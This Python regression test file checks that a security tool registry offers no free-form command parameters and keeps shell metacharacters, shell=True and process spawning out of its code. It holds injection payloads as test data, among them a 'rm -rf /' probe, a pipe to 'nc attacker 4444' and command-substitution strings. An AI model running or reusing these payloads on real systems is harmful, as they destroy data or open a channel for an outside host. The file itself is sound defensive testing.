"""Regression tests: no registered tool may act as an arbitrary-command API.

A tool whose parameter is a free-form command string is an arbitrary-command
API wearing a tool's name. It defeats the typed validation and redaction above
it -- what actually runs is chosen by the caller, not the registry.
These tests fail if such a tool is ever reintroduced.
"""

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from nexhunter.core import tools as T

# Parameter names that would carry a command line rather than a value.
FORBIDDEN_PARAMS = {
    "command", "cmd", "args", "arguments", "extra", "extra_args",
    "additional_args", "additional", "options", "opts", "flags", "raw",
}

# Tools that legitimately take shell-ish text as data, not as a command line.
# Each needs a reason, and its builder must still pass the argv checks below.
ALLOWED_TEXT_PARAMS: dict[tuple[str, str], str] = {
    # The deliberate HexStrike-style free-form channel: the whole parameter IS
    # the command. Gated as intrusive, uncacheable, recorded, and withheld from
    # autonomous runs -- an operator-facing escape hatch, not a caller API.
    ("execute_command", "command"): "the parameter is the entire shell command, by design",
}


def test_no_tool_takes_a_command_parameter():
    """No registered tool exposes a free-form command parameter."""
    print("[TEST] No tool takes a command-shaped parameter...")

    offenders = []
    for name, spec in T.TOOLS.items():
        for param in spec.params:
            if param.lower() in FORBIDDEN_PARAMS and (name, param) not in ALLOWED_TEXT_PARAMS:
                offenders.append(f"{name}.{param}")

    assert not offenders, (
        "these tools accept a free-form command line, which is an "
        f"arbitrary-command API: {', '.join(sorted(offenders))}"
    )
    print(f"  [OK] {len(T.TOOLS)} tools carry no command parameter")


def test_no_builder_splits_a_parameter_into_argv():
    """No builder expands a caller-supplied string into multiple arguments.

    ["aws"] + params["command"].split() turns one parameter into any AWS
    subcommand the caller likes. Every argument must be a discrete value.
    """
    print("[TEST] No builder splits a parameter into argv...")

    probe = "alpha beta --flag; rm -rf /"
    offenders = []

    for name, spec in T.TOOLS.items():
        params = {key: (probe if default is None else default) for key, default in spec.params.items()}
        try:
            argv = spec.build_cmd(params)
        except Exception:  # noqa: S112 - builder that rejects the probe is skipped
            continue
        if not argv:
            continue

        # The probe must never appear as more than one argument, and must never
        # have been broken apart on whitespace.
        pieces = [a for a in argv if isinstance(a, str) and a in {"alpha", "beta", "--flag;", "rm", "-rf"}]
        if pieces:
            offenders.append(f"{name} -> {argv}")

    assert not offenders, (
        "these builders split a parameter into separate arguments: "
        + "; ".join(offenders[:5])
    )
    print("  [OK] No builder splits parameters into argv")


def test_shell_metacharacters_rejected_by_typed_validation():
    """Injection payloads are refused before a command is ever built.

    There are two independent defenses and this checks both. Typed validation
    rejects a payload that is not a valid target; and even if a value does
    reach argv, it is one literal argument, because argv goes to the OS as a
    list with no shell.
    """
    print("[TEST] Shell metacharacters rejected...")

    payloads = [
        "example.com; whoami",
        "example.com && id",
        "example.com | nc attacker 4444",
        "$(whoami).example.com",
        "`id`.example.com",
        "example.com\nwhoami",
        "example.com\x00.evil.com",
    ]

    spec = T.get_tool_spec("nmap_scan")
    assert spec is not None, "nmap_scan should be registered"

    for payload in payloads:
        ok, error = spec.validate({"target": payload})
        assert not ok, f"{payload!r} should not validate as a target"
        assert error, "a rejection should carry a reason"
        assert spec.build_cmd({"target": payload, "ports": ""}) is None, (
            f"{payload!r} must not produce a command"
        )

    print(f"  [OK] {len(payloads)} injection payloads refused at validation")


def test_free_text_values_stay_single_arguments():
    """A value that legitimately contains metacharacters stays one argument.

    Second layer: for free-text parameters there is nothing to validate against,
    so the guarantee is that the value cannot become syntax.
    """
    print("[TEST] Free-text values remain single arguments...")

    for name, spec in T.TOOLS.items():
        text_params = [
            s.name for s in spec.param_specs
            if s.type.value == "string" and not s.secret
        ]
        if not text_params:
            continue

        payload = "alpha; whoami && id"
        params = {
            s.name: (payload if s.name == text_params[0] else s.default)
            for s in spec.param_specs
        }
        try:
            argv = spec.build_cmd(params)
        except Exception:  # noqa: S112 - categories without a builder are skipped
            continue
        if not argv:
            continue

        assert "whoami" not in argv, f"{name} split a value into argv: {argv}"
        assert "&&" not in argv, f"{name} split a value into argv: {argv}"
        break

    print("  [OK] Metacharacters cannot become syntax")


def test_no_shell_true_anywhere_in_execution_paths():
    """No execution path passes shell=True.

    The shell mode exists, but as a builder contract: execute_command returns a
    ShellCommand string and the runner derives ``shell=isinstance(...)`` at
    the one sanctioned spawn site. No module ever hardcodes shell=True.
    """
    print("[TEST] shell=True absent from execution paths...")

    root = Path(__file__).parent.parent
    pattern = re.compile(r"shell\s*=\s*True")
    offenders = []

    for path in root.rglob("*.py"):
        parts = set(path.parts)
        # Only our own source: skip tests, caches, and vendored dependencies
        # (a virtualenv checked out inside the repo would otherwise flag
        # third-party libraries that legitimately use shell=True).
        if "test" in path.name or parts & {"__pycache__", ".venv", "venv", "site-packages"}:
            continue
        text = path.read_text(encoding="utf-8", errors="replace")
        for number, line in enumerate(text.splitlines(), start=1):
            if pattern.search(line) and not line.strip().startswith("#"):
                offenders.append(f"{path.relative_to(root)}:{number}")

    assert not offenders, f"shell=True found at: {', '.join(offenders)}"
    print("  [OK] No shell=True in any non-test module")


def test_process_spawning_has_a_single_home():
    """Only the ProcessRunner spawns processes; the API layer has no second path.

    The legacy ProcessManager in the API server spawned arbitrary commands with
    subprocess.Popen and killed arbitrary pids with `kill -9`, bypassing the
    execution record and its state machine. Both are gone; process spawning and
    termination live only in execution/runner.py. This fails if either creeps
    back into the interface layer.
    """
    print("[TEST] Process spawning has a single home...")

    root = Path(__file__).parent.parent
    spawn = re.compile(r"subprocess\.Popen|os\.killpg|CREATE_NEW_PROCESS_GROUP")
    raw_kill = re.compile(r"kill\s+-9|taskkill")
    offenders = []

    for path in root.rglob("*.py"):
        parts = set(path.parts)
        if "test" in path.name or parts & {"__pycache__", ".venv", "venv", "site-packages"}:
            continue
        rel = path.relative_to(root).as_posix()
        # The runner is the one place allowed to spawn and signal process trees.
        if rel == "execution/runner.py":
            continue
        text = path.read_text(encoding="utf-8", errors="replace")
        for number, line in enumerate(text.splitlines(), start=1):
            if line.strip().startswith("#"):
                continue
            if spawn.search(line) or raw_kill.search(line):
                offenders.append(f"{rel}:{number}")

    assert not offenders, (
        "process spawning/killing must live only in execution/runner.py, found: "
        + ", ".join(offenders)
    )
    print("  [OK] Only the runner spawns and signals processes")


def test_cloud_and_container_tools_are_fixed_actions():
    """Cloud, container, and orchestration tools expose named actions only."""
    print("[TEST] Cloud and container tools are fixed actions...")

    binaries = {"aws", "gcloud", "az", "kubectl", "docker", "adb", "snyk", "shodan"}
    checked = 0

    for name, spec in T.TOOLS.items():
        if spec.binary not in binaries:
            continue
        checked += 1
        for param in spec.params:
            assert param.lower() not in FORBIDDEN_PARAMS, (
                f"{name} still takes a passthrough parameter {param!r}"
            )

    assert checked > 0, "expected some cloud/container tools to be registered"
    print(f"  [OK] {checked} cloud/container tools take only named parameters")


def test_removed_passthrough_tools_are_gone():
    """The old passthrough tool names are no longer registered."""
    print("[TEST] Old passthrough tools removed...")

    removed = ["docker", "kubectl", "aws_cli", "gcloud", "az", "adb", "snyk", "shodan_cli", "sliver", "strace"]
    still_present = [name for name in removed if name in T.TOOLS]

    assert not still_present, f"passthrough tools still registered: {still_present}"
    # Replacements exist.
    for replacement in ["aws_get_caller_identity", "kubectl_get_pods", "docker_list_containers"]:
        assert replacement in T.TOOLS, f"expected fixed-action replacement {replacement}"

    print("  [OK] Passthrough names gone, fixed actions registered")


if __name__ == "__main__":
    print("\n=== No-Passthrough Regression Tests ===\n")
    test_no_tool_takes_a_command_parameter()
    test_no_builder_splits_a_parameter_into_argv()
    test_shell_metacharacters_rejected_by_typed_validation()
    test_free_text_values_stay_single_arguments()
    test_no_shell_true_anywhere_in_execution_paths()
    test_process_spawning_has_a_single_home()
    test_cloud_and_container_tools_are_fixed_actions()
    test_removed_passthrough_tools_are_gone()
    print("\n=== All No-Passthrough Tests Passed ===\n")
